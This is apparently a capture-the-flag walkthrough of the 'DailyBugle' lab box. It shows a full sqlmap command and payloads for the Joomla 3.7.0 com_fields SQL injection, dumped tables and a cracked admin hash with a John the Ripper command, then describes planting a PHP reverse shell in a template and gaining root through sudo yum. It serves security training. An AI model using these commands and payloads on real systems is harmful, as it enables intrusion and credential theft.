# DailyBugle

**CTF Domain: DailyBugle.ctf**

## Scans

```rustscan -a DailyBugle.ctf```


## Eumeration

http://dailybugle.ctf/README.txt - States Joomla version 3.7.0

Searchsploit:
```
 Exploit Title                                                                       |  Path
------------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7 - SQL Injection                                                          | php/remote/44227.php
Joomla! 3.7.0 - 'com_fields' SQL Injection                                           | php/webapps/42033.txt
Joomla! Component ARI Quiz 3.7.4 - SQL Injection                                     | php/webapps/46769.txt
Joomla! Component com_realestatemanager 3.7 - SQL Injection                          | php/webapps/38445.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                        | php/webapps/43488.txt
Joomla! Component J2Store < 3.3.7 - SQL Injection                                    | php/webapps/46467.txt
Joomla! Component JomEstate PRO 3.7 - 'id' SQL Injection                             | php/webapps/44117.txt
Joomla! Component Jtag Members Directory 5.3.7 - Arbitrary File Download             | php/webapps/43913.txt
Joomla! Component Quiz Deluxe 3.7.4 - SQL Injection                                  | php/webapps/42589.txt
```

com_fields POC (php/webapps/42033.txt) gives an SQLmap command: `sqlmap -u "http://dailybugle.ctf/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]`

dailybugle.ctf/web.config.txt - Seems to patch the vulnerability in that specific url?

Nope SQLMap runs fine:
```
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9128 FROM(SELECT COUNT(*),CONCAT(0x717a787871,(SELECT (ELT(9128=9128,1))),0x7170767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7225 FROM (SELECT(SLEEP(5)))dUNc)
```
```
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test
```
```
Database: mysql
[24 tables]
+---------------------------+
| user                      |
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| ndb_binlog_index          |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| servers                   |
| slow_log                  |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
+---------------------------+
```
```
Database: joomla
[72 tables]
+----------------------------+
| #__assets                  |
| #__associations            |
| #__banner_clients          |
| #__banner_tracks           |
| #__banners                 |
| #__categories              |
| #__contact_details         |
| #__content_frontpage       |
| #__content_rating          |
| #__content_types           |
| #__content                 |
| #__contentitem_tag_map     |
| #__core_log_searches       |
| #__extensions              |
| #__fields_categories       |
| #__fields_groups           |
| #__fields_values           |
| #__fields                  |
| #__finder_filters          |
| #__finder_links_terms0     |
| #__finder_links_terms1     |
| #__finder_links_terms2     |
| #__finder_links_terms3     |
| #__finder_links_terms4     |
| #__finder_links_terms5     |
| #__finder_links_terms6     |
| #__finder_links_terms7     |
| #__finder_links_terms8     |
| #__finder_links_terms9     |
| #__finder_links_termsa     |
| #__finder_links_termsb     |
| #__finder_links_termsc     |
| #__finder_links_termsd     |
| #__finder_links_termse     |
| #__finder_links_termsf     |
| #__finder_links            |
| #__finder_taxonomy_map     |
| #__finder_taxonomy         |
| #__finder_terms_common     |
| #__finder_terms            |
| #__finder_tokens_aggregate |
| #__finder_tokens           |
| #__finder_types            |
| #__languages               |
| #__menu_types              |
| #__menu                    |
| #__messages_cfg            |
| #__messages                |
| #__modules_menu            |
| #__modules                 |
| #__newsfeeds               |
| #__overrider               |
| #__postinstall_messages    |
| #__redirect_links          |
| #__schemas                 |
| #__session                 |
| #__tags                    |
| #__template_styles         |
| #__ucm_base                |
| #__ucm_content             |
| #__ucm_history             |
| #__update_sites_extensions |
| #__update_sites            |
| #__updates                 |
| #__user_keys               |
| #__user_notes              |
| #__user_profiles           |
| #__user_usergroup_map      |
| #__usergroups              |
| #__users                   |
| #__utf8_conversion         |
| #__viewlevels              |
+----------------------------+
```

```
current user: 'root@localhost'
```

Possible root password? SHA1 Hashed: B04E65424026AC47B5626445B67352EBEFD78828

Cracked = `¡Vamos!` ???

Joomla Users table:
```
Database: joomla
Table: #__users
[1 entry]
+------------+----------+--------------------------------------------------------------+
| name       | username | password                                                     |
+------------+----------+--------------------------------------------------------------+
| Super User | jonah    | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |
+------------+----------+--------------------------------------------------------------+
```

Crack it with John: `john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt jonah_password.hash`

Jonah's cracked password: `spiderman123`!


## Exploitation

Great writeup of Joomla reverse shell: https://www.hackingarticles.in/joomla-reverse-shell/

Logging into the Joomla admin panel (/administrator) gives us access to the site templates

Get a simple PHP reverse shell, edit it for our needs

Copy and paste it into the index.php of the active template

And we have a reverse shell!

User is apache though, and I cannot find a user flag...

Guessing we have to switch to jjameson to get the flag

There's a root password in configuration.php that has a password in it

That password works on jjamesons SSH!


## Privilege Escalation

Very easy but cool privesc path

Linpeas shows we can run yum as sudo

https://gtfobins.github.io/gtfobins/yum/

Copy/pasting the commands from GTFObins gives us command execution as root

Just needed to install RPM onto my system for it to work

Then wrote a simple privesc shell script that created a bash reverse shell to my system

Compiling the script into a package and installing it gives us a root shell!!!
